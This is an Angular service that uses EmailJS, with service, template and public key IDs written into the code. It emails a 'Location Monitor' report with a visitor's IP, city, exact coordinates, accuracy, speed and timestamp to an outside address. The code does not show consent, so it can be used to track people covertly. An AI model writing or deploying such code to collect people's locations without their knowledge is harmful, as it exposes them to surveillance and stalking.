import { Injectable } from '@angular/core';
import emailjs from '@emailjs/browser'

@Injectable({
  providedIn: 'root'
})
export class EmailJSService {

  constructor() { }

  private serviceId = 'service_qqkmo1p';
  private templateId = 'template_n4fj5al';
  private publicKey = 'beN2at3UP_WWZWPgq';

  sendEmail(message: any) {
    const templateParams = {
      message1: `New visit with ip ${message.ip} from ${message.city} \n Co-ordinate: ${message.location}`,
      message: `Hello,

A location has been detected successfully.

📍 LOCATION DETAILS
────────────────────
City       : ${message.city}
IP         : ${message.ip}
Coordinates: ${message.lat}, ${message.long}
Accuracy   : ${message.acc} m
Speed      : ${message.speed ?? 'Not available'}
Ip detected address    : ${message.location}

Detected   : ${message.timestamp}

Regards,
Location Monitor`
    };

    return emailjs.send(
      this.serviceId,
      this.templateId,
      templateParams,
      {
        publicKey: this.publicKey
      }
    );
  }
}
